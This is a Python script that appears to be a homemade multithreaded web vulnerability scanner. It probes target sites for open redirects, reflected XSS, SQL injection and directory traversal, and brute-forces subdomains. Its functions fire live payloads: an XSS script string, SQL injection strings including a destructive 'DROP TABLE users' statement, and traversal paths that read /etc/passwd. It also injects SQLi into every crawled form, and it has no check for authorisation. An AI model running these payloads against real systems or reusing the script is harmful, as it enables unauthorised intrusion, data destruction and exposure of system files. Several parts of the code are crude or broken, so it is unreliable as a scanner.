import requests
from bs4 import BeautifulSoup
import re
import threading
import time
from urllib.parse import urlparse, urljoin
import dns.resolver
from queue import Queue

# Set up User-Agent and Session for making requests
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
SESSION = requests.Session()
SESSION.headers.update({'User-Agent': USER_AGENT})

# Function to check for open redirects
def check_open_redirect(url):
    print(f"[*] Checking for Open Redirect: {url}")
    response = SESSION.get(url)
    final_url = response.url
    if final_url != url:
        print(f"[!] Open Redirect Detected: {final_url}")

# Function to check for XSS vulnerabilities (reflected XSS check)
def check_xss(url):
    payload = "<script>alert('XSS')</script>"
    params = get_url_params(url)
    for param in params:
        xss_url = f"{url}&{param}={payload}"
        response = SESSION.get(xss_url)
        if payload in response.text:
            print(f"[!] Reflected XSS Detected at: {xss_url}")

# Function to check for SQL Injection vulnerabilities
def check_sql_injection(url):
    payloads = ["' OR 1=1 --", "' OR 'a'='a", "' AND 1=1 --", "'; DROP TABLE users --"]
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = SESSION.get(test_url)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print(f"[!] Possible SQL Injection Vulnerability at: {test_url}")

# Function to check for Directory Traversal vulnerabilities
def check_directory_traversal(url):
    payloads = ["../../../etc/passwd", "../../../../etc/passwd"]
    for payload in payloads:
        test_url = f"{url}?file={payload}"
        response = SESSION.get(test_url)
        if "root:" in response.text or "bin:" in response.text:
            print(f"[!] Directory Traversal Vulnerability Detected at: {test_url}")

# Function to extract parameters from a URL query string
def get_url_params(url):
    parsed_url = urlparse(url)
    params = []
    if parsed_url.query:
        for param in parsed_url.query.split("&"):
            params.append(param.split("=")[0])
    return params

# Function to perform Subdomain Enumeration (Brute-force method)
def subdomain_enum(domain):
    subdomains = ['www', 'dev', 'test', 'staging', 'beta', 'api']
    for sub in subdomains:
        subdomain = f"{sub}.{domain}"
        try:
            response = SESSION.get(f"http://{subdomain}")
            if response.status_code == 200:
                print(f"[+] Subdomain found: {subdomain}")
        except requests.RequestException:
            continue

# Function to crawl a website and find forms to test for SQL Injection
def crawl_website(url):
    print(f"[*] Crawling website: {url} for forms")
    response = SESSION.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        form_data = {}
        for input_tag in inputs:
            name = input_tag.get('name')
            if name:
                form_data[name] = "' OR 1=1 --"  # Test for SQLi
        submit_url = urljoin(url, action) if action else url
        if method == 'post':
            response = SESSION.post(submit_url, data=form_data)
        else:
            response = SESSION.get(submit_url, params=form_data)
        if "error" in response.text.lower():
            print(f"[!] Possible SQL Injection in form at: {submit_url}")

# Function to scan a website for various vulnerabilities
def scan_website(url):
    print(f"[*] Starting scan for: {url}")
    check_open_redirect(url)
    check_xss(url)
    check_sql_injection(url)
    check_directory_traversal(url)
    crawl_website(url)

    domain = urlparse(url).netloc
    subdomain_enum(domain)

    print(f"[*] Scan completed for: {url}")

# Function to resolve and get DNS records for subdomain enumeration
def resolve_dns(domain):
    try:
        resolver = dns.resolver.Resolver()
        answers = resolver.query(domain, 'A')
        for answer in answers:
            print(f"[+] Subdomain resolved: {domain} -> {answer}")
    except dns.resolver.NoAnswer:
        print(f"[-] No A record found for {domain}")
    except dns.resolver.NXDOMAIN:
        print(f"[-] Domain {domain} does not exist")

# Function to handle multi-threading for faster scans
def threaded_scan(url_queue):
    while not url_queue.empty():
        url = url_queue.get()
        try:
            scan_website(url)
        except Exception as e:
            print(f"Error scanning {url}: {str(e)}")
        finally:
            url_queue.task_done()

# Main function to run the scanner
def main():
    urls_to_scan = [
        "http://example.com",  # Replace with your target URLs
        "http://test.com",
    ]
    
    url_queue = Queue()
    for url in urls_to_scan:
        url_queue.put(url)

    print(f"[*] Starting scans for {url_queue.qsize()} websites...")

    # Start multiple threads for parallel scanning
    threads = []
    for _ in range(4):  # Adjust the number of threads for faster scanning
        thread = threading.Thread(target=threaded_scan, args=(url_queue,))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print(f"[*] All scans completed.")

# Entry point
if __name__ == "__main__":
    start_time = time.time()
    main()
    print(f"[*] Total time taken: {time.time() - start_time:.2f} seconds.")
